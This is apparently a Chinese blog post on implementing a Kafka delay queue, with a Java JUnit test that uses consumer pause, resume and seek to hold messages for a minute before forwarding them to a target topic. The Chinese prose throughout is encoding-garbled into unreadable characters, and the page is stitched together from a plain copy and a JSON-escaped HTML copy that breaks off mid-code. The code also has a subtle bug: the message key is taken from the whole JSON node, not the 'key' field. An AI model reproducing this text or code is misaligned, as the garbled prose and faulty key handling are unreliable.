æ­¤æˆ‘ä»¬éœ€è¦æƒ³ä¸€ä¸ªåŠæ³•ï¼Œè®©æ¶ˆæ¯å»¶è¿Ÿå‘é€å‡ºå»ã€‚\nç½‘ä¸Šå·²ç»æœ‰å¤§ç¥ç»™å‡ºäº†å¦‚ä¸‹æ–¹æ¡ˆï¼š\nåœ¨å‘é€å»¶è¿Ÿæ¶ˆæ¯æ—¶ä¸ç›´æ¥å‘é€åˆ°ç›®æ ‡topicï¼Œè€Œæ˜¯å‘é€åˆ°ä¸€ä¸ªç”¨äºå¤„ç†å»¶è¿Ÿæ¶ˆæ¯çš„topicï¼Œä¾‹å¦‚delay-minutes-1 å†™ä¸€æ®µä»£ç æ‹‰å–delay-minutes-1ä¸­çš„æ¶ˆæ¯ï¼Œå°†æ»¡è¶³æ¡ä»¶çš„æ¶ˆæ¯å‘é€åˆ°çœŸæ­£çš„ç›®æ ‡ä¸»é¢˜é‡Œã€‚ å°±åƒç”»ä¸€åŒ¹é©¬ä¸€æ ·ç®€å•ã€‚\næ–¹æ¡ˆæ˜¯å¥½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ›´å¤šç»†èŠ‚ã€‚\nå®Œå–„ç»†èŠ‚ é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Ÿ\né—®é¢˜å‡ºåœ¨å»¶è¿Ÿæ¶ˆæ¯å‘å‡ºå»ä¹‹åï¼Œä»£ç ç¨‹åºå°±ä¼šç«‹åˆ»æ”¶åˆ°å»¶è¿Ÿæ¶ˆæ¯ï¼Œè¦å¦‚ä½•å¤„ç†æ‰èƒ½è®©å»¶è¿Ÿæ¶ˆæ¯ç­‰å¾…ä¸€æ®µæ—¶é—´æ‰å‘é€åˆ°çœŸæ­£çš„topicé‡Œé¢ã€‚\nå¯èƒ½æœ‰åŒå­¦ä¼šè§‰å¾—å¾ˆç®€å•å˜›ï¼Œåœ¨ä»£ç ç¨‹åºæ”¶åˆ°æ¶ˆæ¯ä¹‹ååˆ¤æ–­æ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±è°ƒç”¨sleepæ–¹æ³•ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´æˆ‘å†è¿›è¡Œä¸‹ä¸€ä¸ªå¾ªç¯æ‹‰å–æ¶ˆæ¯ã€‚\nçœŸçš„å¯è¡Œå—?\nä¸€åˆ‡å¥½åƒéƒ½å¾ˆç¾å¥½ï¼Œä½†è¿™æ˜¯ä¸å¯è¡Œçš„ã€‚\nè¿™æ˜¯å› ä¸ºåœ¨è½®è¯¢kafkaæ‹‰å–æ¶ˆæ¯çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›ç”±max.poll.recordsé…ç½®æŒ‡å®šçš„ä¸€æ‰¹æ¶ˆæ¯ï¼Œä½†æ˜¯å½“ç¨‹åºä»£ç ä¸èƒ½åœ¨max.poll.interval.msé…ç½®çš„æœŸæœ›æ—¶é—´å†…å¤„ç†è¿™äº›æ¶ˆæ¯çš„è¯ï¼Œkafkaå°±ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚äº†ï¼Œä¼šè¿›è¡Œrebalanceï¼ŒåŒæ—¶ä½ è¿™ä¸ªæ¶ˆè´¹è€…å°±æ— æ³•å†æ‹‰å–åˆ°ä»»ä½•æ¶ˆæ¯äº†ã€‚\nä¸¾ä¸ªä¾‹å­ï¼šå½“ä½ éœ€è¦ä¸€ä¸ª24å°æ—¶çš„å»¶è¿Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼Œåœ¨ä»£ç é‡Œé¢å†™ä¸‹äº†Thread.sleep(1000*60*60*24);ï¼Œä¸ºäº†ä¸å‘ç”Ÿrebalanceï¼Œä½ æŠŠmax.poll.interval.ms ä¹Ÿæ”¹æˆäº†1000*60*60*24ï¼Œè¿™ä¸ªæ—¶å€™ä½ æˆ–è®¸ä¼šæ„Ÿè§‰åˆ°ä¸€ä¸ä¸çš„æ€ªå¼‚ï¼Œæˆ‘æ˜¯è°ï¼Ÿæˆ‘åœ¨å“ªï¼Ÿæˆ‘ä¸ºä»€ä¹ˆè¦å†™å‡ºæ¥è¿™æ ·çš„ä»£ç ï¼Ÿ\nå…¶å®æˆ‘ä»¬å¯ä»¥æ›´ä¼˜é›…çš„å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚\nKafkaConsumer æä¾›äº†æš‚åœå’Œæ¢å¤çš„APIå‡½æ•°ï¼Œè°ƒç”¨æ¶ˆè´¹è€…çš„æš‚åœæ–¹æ³•åå°±æ— æ³•å†æ‹‰å–åˆ°æ–°çš„æ¶ˆæ¯ï¼ŒåŒæ—¶é•¿æ—¶é—´ä¸æ¶ˆè´¹kafkaä¹Ÿä¸ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚æ‰äº†ã€‚å¦å¤–ä¸ºäº†èƒ½å¤Ÿæ›´åŠ ä¼˜é›…ï¼Œæˆ‘ä»¬ä¼šå¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨æ¥æ›¿æ¢sleepã€‚ï¼Œå®Œæ•´æµç¨‹å¦‚ä¸‹å›¾ï¼Œå½“æ¶ˆè´¹è€…å‘ç°æ¶ˆæ¯ä¸æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæˆ‘ä»¬å°±æš‚åœæ¶ˆè´¹è€…ï¼Œå¹¶æŠŠåç§»é‡seekåˆ°ä¸Šä¸€æ¬¡æ¶ˆè´¹çš„ä½ç½®ä»¥ä¾¿ç­‰å¾…ä¸‹ä¸€ä¸ªå‘¨æœŸå†æ¬¡æ¶ˆè´¹è¿™æ¡æ¶ˆæ¯ã€‚\nJavaä»£ç å®ç° import com.fasterxml.jackson.core.JsonProcessingException; import com.fasterxml.jackson.databind.JsonNode; import com.fasterxml.jackson.databind.ObjectMapper; import org.apache.kafka.clients.consumer.*; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerConfig; import org.apache.kafka.clients.producer.ProducerRecord; import org.apache.kafka.common.TopicPartition; import org.apache.kafka.common.serialization.StringDeserializer; import org.apache.kafka.common.serialization.StringSerializer; import org.junit.jupiter.api.BeforeEach; import org.junit.jupiter.api.Test; import org.springframework.boot.test.context.SpringBootTest; import java.time.Duration; import java.util.*; import java.util.concurrent.ExecutionException; @SpringBootTest public class DelayQueueTest { private KafkaConsumer\u0026lt;String, String\u0026gt; consumer; private KafkaProducer\u0026lt;String, String\u0026gt; producer; private volatile Boolean exit = false; private final Object lock = new Object(); private final String servers = \u0026#34;\u0026#34;; @BeforeEach void initConsumer() { Properties props = new Properties(); props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, servers); props.put(ConsumerConfig.GROUP_ID_CONFIG, \u0026#34;d\u0026#34;); props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \u0026#34;false\u0026#34;); props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \u0026#34;earliest\u0026#34;); props.put(ConsumerConfig.ISOLATION_LEVEL_CONFIG, \u0026#34;read_committed\u0026#34;); props.put(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG, \u0026#34;5000\u0026#34;); consumer = new KafkaConsumer\u0026lt;\u0026gt;(props, new StringDeserializer(), new StringDeserializer()); } @BeforeEach void initProducer() { Properties props = new Properties(); props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, servers); props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); producer = new KafkaProducer\u0026lt;\u0026gt;(props); } @Test void testDelayQueue() throws JsonProcessingException, InterruptedException { String topic = \u0026#34;delay-minutes-1\u0026#34;; List\u0026lt;String\u0026gt; topics = Collections.singletonList(topic); consumer.subscribe(topics); Timer timer = new Timer(); timer.schedule(new TimerTask() { @Override public void run() { synchronized (lock) { consumer.resume(consumer.paused()); lock.notify(); } } }, 0, 1000); do { synchronized (lock) { ConsumerRecords\u0026lt;String, String\u0026gt; consumerRecords = consumer.poll(Duration.ofMillis(200)); if (consumerRecords.isEmpty()) { lock.wait(); continue; } boolean timed = false; for (ConsumerRecord\u0026lt;String, String\u0026gt; consumerRecord : consumerRecords) { long timestamp = consumerRecord.timestamp(); TopicPartition topicPartition = new TopicPartition(consumerRecord.topic(), consumerRecord.partition()); if (timestamp + 60 * 1000 \u0026lt; System.currentTimeMillis()) { String value = consumerRecord.value(); ObjectMapper objectMapper = new ObjectMapper(); JsonNode jsonNode = objectMapper.readTree(value); JsonNode jsonNodeTopic = jsonNode.get(\u0026#34;topic\u0026#34;); String appTopic = null, appKey = null, appValue = null; if (jsonNodeTopic != null) { appTopic = jsonNodeTopic.asText(); } if (appTopic == null) { continue; } JsonNode jsonNodeKey = jsonNode.get(\u0026#34;key\u0026#34;); if (jsonNodeKey != null) { appKey = jsonNode.asText(); } JsonNode jsonNodeValue = jsonNode.get(\u0026#34;value\u0026#34;); if (jsonNodeValue != null) { appValue = jsonNodeValue.asText(); } // send to application topic ProducerRecord\u0026lt;String, String\u0026gt; producerRecord = new ProducerRecord\u0026lt;\u0026gt;(appTopic, appKey, appValue); try { producer.send(producerRecord).get(); // success. commit message OffsetAndMetadata offsetAndMetadata = new OffsetAndMetadata(consumerRecord.offset() + 1); HashMap\u0026lt;TopicPartition, OffsetAndMetadata\u0026gt; metadataHashMap = new HashMap\u0026lt;\u0026gt;(); metadataHashMap.put(topicPartition, offsetAndMetadata); consumer.commitSync(metadataHashMap); } catch (ExecutionException e) { consumer.pause(Collections.singletonList(topicPartition)); consumer.seek(topicPartition, consumerRecord.offset()); timed = true; break; } } else { consumer.pause(Collections.singletonList(topicPartition)); consumer.seek(topicPartition, consumerRecord.offset()); timed = true; break; } } if (timed) { lock.wait(); } } } while (!exit); } } è¿™æ®µç¨‹åºæ˜¯åŸºäºSpringBoot 2.4.4ç‰ˆæœ¬å’Œ kafka-client 2.7.0ç‰ˆæœ¬ç¼–å†™çš„ä¸€ä¸ªå•å…ƒæµ‹è¯•ï¼Œéœ€è¦ä¿®æ”¹ç§æœ‰å˜é‡serversä¸ºkafka brokerçš„åœ°å€ã€‚\nåœ¨å¯åŠ¨ç¨‹åºåï¼Œå‘Topic delay-minutes-1 å‘é€å¦‚ä»¥ä¸‹æ ¼å¼çš„jsonå­—ç¬¦ä¸²æ•°æ®\n{ \u0026#34;topic\u0026#34;: \u0026#34;target\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;key1\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;value1\u0026#34; } åŒæ—¶å¯åŠ¨ä¸€ä¸ªæ¶ˆè´¹è€…ç›‘å¬topic targetï¼Œåœ¨ä¸€åˆ†é’Ÿåï¼Œå°†ä¼šæ”¶åˆ°ä¸€æ¡ key=\u0026ldquo;key1\u0026rdquo;, value=\u0026ldquo;value1\u0026quot;çš„æ•°æ®ã€‚\næºä»£ç åœ°å€\nè¿˜éœ€è¦åšä»€ä¹ˆï¼Ÿ åˆ›å»ºå¤šä¸ªtopicç”¨äºå¤„ç†ä¸åŒæ—¶é—´çš„å»¶è¿Ÿæ¶ˆæ¯ï¼Œä¾‹å¦‚delay-minutes-1 delay-minutes-5 delay-minutes-10 delay-minutes-15ä»¥æä¾›æŒ‡æ•°çº§åˆ«çš„å»¶è¿Ÿæ—¶é—´ï¼Œè¿™æ ·æ¯”ä¸€ä¸ªtopicè¦å¥½å¾ˆå¤šï¼Œæ¯•ç«Ÿåœ¨é¡ºåºæ‹‰å–æ¶ˆæ¯çš„æ—¶å€™ï¼Œæœ‰ä¸€æ¡æ¶ˆæ¯ä¸æ»¡è¶³æ¡ä»¶ï¼Œåé¢çš„å°†å…¨éƒ¨è¿›è¡Œæ’é˜Ÿã€‚\n","permalink":"https://www.typesafe.cn/posts/kafka-delay-queue/","summary":"\u003ch1 id=\"åŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—\"\u003eåŸºäºkafkaå®ç°å»¶è¿Ÿé˜Ÿåˆ—\u003c/h1\u003e\n\u003cp\u003ekafkaä½œä¸ºä¸€ä¸ªä½¿ç”¨å¹¿æ³›çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¾ˆå¤šäººéƒ½ä¸ä¼šé™Œç”Ÿï¼Œä½†å½“ä½ åœ¨ç½‘ä¸Šæœç´¢â€œkafka å»¶è¿Ÿé˜Ÿåˆ—â€ï¼Œå‡ºç°çš„éƒ½æ˜¯ä¸€äº›è®²è§£æ—¶é—´è½®æˆ–è€…åªæ˜¯æä¾›äº†ä¸€äº›æ€è·¯ï¼Œå¹¶æ²¡æœ‰ä¸€ä»½çœŸå®å¯ç”¨çš„ä»£ç å®ç°ï¼Œä»Šå¤©æˆ‘ä»¬å°±æ¥æ‰“ç ´è¿™ä¸ªç°è±¡ï¼Œæä¾›ä¸€ä»½å¯è¿è¡Œçš„ä»£ç ï¼ŒæŠ›ç –å¼•ç‰ï¼Œå¸å¼•æ›´å¤šçš„å¤§ç¥æ¥åˆ†äº«ã€‚\u003c/p\u003e\n\u003ch3 id=\"åŸºäºkafkaå¦‚ä½•å®ç°å»¶è¿Ÿé˜Ÿåˆ—\"\u003eåŸºäºkafkaå¦‚ä½•å®ç°å»¶è¿Ÿé˜Ÿåˆ—ï¼Ÿ\u003c/h3\u003e\n\u003cp\u003eæƒ³è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ†è§£é—®é¢˜ã€‚kafkaä½œä¸ºä¸€ä¸ªé«˜æ€§èƒ½çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåªè¦æ¶ˆè´¹èƒ½åŠ›è¶³å¤Ÿï¼Œå‘å‡ºçš„æ¶ˆæ¯éƒ½æ˜¯ä¼šç«‹åˆ»æ”¶åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³ä¸€ä¸ªåŠæ³•ï¼Œè®©æ¶ˆæ¯å»¶è¿Ÿå‘é€å‡ºå»ã€‚\u003c/p\u003e\n\u003cp\u003eç½‘ä¸Šå·²ç»æœ‰å¤§ç¥ç»™å‡ºäº†å¦‚ä¸‹æ–¹æ¡ˆï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eåœ¨å‘é€å»¶è¿Ÿæ¶ˆæ¯æ—¶ä¸ç›´æ¥å‘é€åˆ°ç›®æ ‡topicï¼Œè€Œæ˜¯å‘é€åˆ°ä¸€ä¸ªç”¨äºå¤„ç†å»¶è¿Ÿæ¶ˆæ¯çš„topicï¼Œä¾‹å¦‚\u003ccode\u003edelay-minutes-1\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eå†™ä¸€æ®µä»£ç æ‹‰å–\u003ccode\u003edelay-minutes-1\u003c/code\u003eä¸­çš„æ¶ˆæ¯ï¼Œå°†æ»¡è¶³æ¡ä»¶çš„æ¶ˆæ¯å‘é€åˆ°çœŸæ­£çš„ç›®æ ‡ä¸»é¢˜é‡Œã€‚\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eå°±åƒç”»ä¸€åŒ¹é©¬ä¸€æ ·ç®€å•ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"æ€æ ·ç”»é©¬\" loading=\"lazy\" src=\"https://oss.typesafe.cn/uPic/%E6%80%8E%E6%A0%B7%E7%94%BB%E9%A9%AC.jpeg\"\u003e\u003c/p\u003e\n\u003cp\u003eæ–¹æ¡ˆæ˜¯å¥½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ›´å¤šç»†èŠ‚ã€‚\u003c/p\u003e\n\u003ch3 id=\"å®Œå–„ç»†èŠ‚\"\u003eå®Œå–„ç»†èŠ‚\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eé—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Ÿ\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eé—®é¢˜å‡ºåœ¨å»¶è¿Ÿæ¶ˆæ¯å‘å‡ºå»ä¹‹åï¼Œä»£ç ç¨‹åºå°±ä¼šç«‹åˆ»æ”¶åˆ°å»¶è¿Ÿæ¶ˆæ¯ï¼Œè¦å¦‚ä½•å¤„ç†æ‰èƒ½è®©å»¶è¿Ÿæ¶ˆæ¯ç­‰å¾…ä¸€æ®µæ—¶é—´æ‰å‘é€åˆ°çœŸæ­£çš„topicé‡Œé¢ã€‚\u003c/p\u003e\n\u003cp\u003eå¯èƒ½æœ‰åŒå­¦ä¼šè§‰å¾—å¾ˆç®€å•å˜›ï¼Œåœ¨ä»£ç ç¨‹åºæ”¶åˆ°æ¶ˆæ¯ä¹‹ååˆ¤æ–­æ¡ä»¶ä¸æ»¡è¶³ï¼Œå°±è°ƒç”¨\u003ccode\u003esleep\u003c/code\u003eæ–¹æ³•ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´æˆ‘å†è¿›è¡Œä¸‹ä¸€ä¸ªå¾ªç¯æ‹‰å–æ¶ˆæ¯ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eçœŸçš„å¯è¡Œå—?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eä¸€åˆ‡å¥½åƒéƒ½å¾ˆç¾å¥½ï¼Œä½†è¿™æ˜¯ä¸å¯è¡Œçš„ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ˜¯å› ä¸ºåœ¨è½®è¯¢kafkaæ‹‰å–æ¶ˆæ¯çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›ç”±\u003ccode\u003emax.poll.records\u003c/code\u003eé…ç½®æŒ‡å®šçš„ä¸€æ‰¹æ¶ˆæ¯ï¼Œä½†æ˜¯å½“ç¨‹åºä»£ç ä¸èƒ½åœ¨\u003ccode\u003emax.poll.interval.ms\u003c/code\u003eé…ç½®çš„æœŸæœ›æ—¶é—´å†…å¤„ç†è¿™äº›æ¶ˆæ¯çš„è¯ï¼Œkafkaå°±ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚äº†ï¼Œä¼šè¿›è¡Œ\u003ccode\u003erebalance\u003c/code\u003eï¼ŒåŒæ—¶ä½ è¿™ä¸ªæ¶ˆè´¹è€…å°±æ— æ³•å†æ‹‰å–åˆ°ä»»ä½•æ¶ˆæ¯äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸¾ä¸ªä¾‹å­ï¼šå½“ä½ éœ€è¦ä¸€ä¸ª24å°æ—¶çš„å»¶è¿Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼Œåœ¨ä»£ç é‡Œé¢å†™ä¸‹äº†\u003ccode\u003eThread.sleep(1000*60*60*24);\u003c/code\u003eï¼Œä¸ºäº†ä¸å‘ç”Ÿ\u003ccode\u003erebalance\u003c/code\u003eï¼Œä½ æŠŠ\u003ccode\u003emax.poll.interval.ms\u003c/code\u003e ä¹Ÿæ”¹æˆäº†\u003ccode\u003e1000*60*60*24\u003c/code\u003eï¼Œè¿™ä¸ªæ—¶å€™ä½ æˆ–è®¸ä¼šæ„Ÿè§‰åˆ°ä¸€ä¸ä¸çš„æ€ªå¼‚ï¼Œæˆ‘æ˜¯è°ï¼Ÿæˆ‘åœ¨å“ªï¼Ÿæˆ‘ä¸ºä»€ä¹ˆè¦å†™å‡ºæ¥è¿™æ ·çš„ä»£ç ï¼Ÿ\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eå…¶å®æˆ‘ä»¬å¯ä»¥æ›´ä¼˜é›…çš„å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eKafkaConsumer æä¾›äº†æš‚åœå’Œæ¢å¤çš„APIå‡½æ•°ï¼Œè°ƒç”¨æ¶ˆè´¹è€…çš„æš‚åœæ–¹æ³•åå°±æ— æ³•å†æ‹‰å–åˆ°æ–°çš„æ¶ˆæ¯ï¼ŒåŒæ—¶é•¿æ—¶é—´ä¸æ¶ˆè´¹kafkaä¹Ÿä¸ä¼šè®¤ä¸ºè¿™ä¸ªæ¶ˆè´¹è€…å·²ç»æŒ‚æ‰äº†ã€‚å¦å¤–ä¸ºäº†èƒ½å¤Ÿæ›´åŠ ä¼˜é›…ï¼Œæˆ‘ä»¬ä¼šå¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨æ¥æ›¿æ¢\u003ccode\u003esleep\u003c/code\u003eã€‚ï¼Œå®Œæ•´æµç¨‹å¦‚ä¸‹å›¾ï¼Œå½“æ¶ˆè´¹è€…å‘ç°æ¶ˆæ¯ä¸æ»¡è¶³æ¡ä»¶æ—¶ï¼Œæˆ‘ä»¬å°±æš‚åœæ¶ˆè´¹è€…ï¼Œå¹¶æŠŠåç§»é‡seekåˆ°ä¸Šä¸€æ¬¡æ¶ˆè´¹çš„ä½ç½®ä»¥ä¾¿ç­‰å¾…ä¸‹ä¸€ä¸ªå‘¨æœŸå†æ¬¡æ¶ˆè´¹è¿™æ¡æ¶ˆæ¯ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"kafka-delay-queue\" loading=\"lazy\" src=\"https://oss.typesafe.cn/uPic/kafka-delay-queue.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"javaä»£ç å®ç°\"\u003eJavaä»£ç å®ç°\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e com.fasterxml.jackson.core.JsonProcessingException;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e com.fasterxml.jackson.databind.JsonNode;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e com.fasterxml.jackson.databind.ObjectMapper;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.apache.kafka.clients.consumer.*;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.apache.kafka.clients.producer.KafkaProducer;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.apache.kafka.clients.producer.ProducerConfig;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.apache.kafka.clients.producer.ProducerRecord;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.apache.kafka.common.TopicPartition;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.apache.kafka.common.serialization.StringDeserializer;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.apache.kafka.common.serialization.StringSerializer;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.junit.jupiter.api.BeforeEach;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.junit.jupiter.api.Test;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e org.springframework.boot.test.context.SpringBootTest;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.time.Duration;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.util.*;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.util.concurrent.ExecutionException;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@SpringBootTest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eDelayQueueTest\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e KafkaConsumer\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eString, String\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e consumer;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e KafkaProducer\u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003eString, String\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e producer;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evolatile\u003c/span\u003e Boolean exit \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efinal\u003c/span\u003e Object lock \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Object();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efinal\u003c/span\u003e String servers \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003e@BeforeEach\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003einitConsumer\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Properties props \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Properties();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ConsumerConfig.\u003cspan style=\"color:#a6e22e\"\u003eBOOTSTRAP_SERVERS_CONFIG\u003c/span\u003e, servers);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ConsumerConfig.\u003cspan style=\"color:#a6e22e\"\u003eGROUP_ID_CONFIG\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;d\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        props.\u003cspan style=\"color:#a6e22e\"\u003eput\u003c/span\u003e(ConsumerConfig.\u003cspan style=\"color:#a6e22e\"\u003eENABLE_AUTO_COMMIT_CONFIG\u003c/span\u003e, \u003cspan 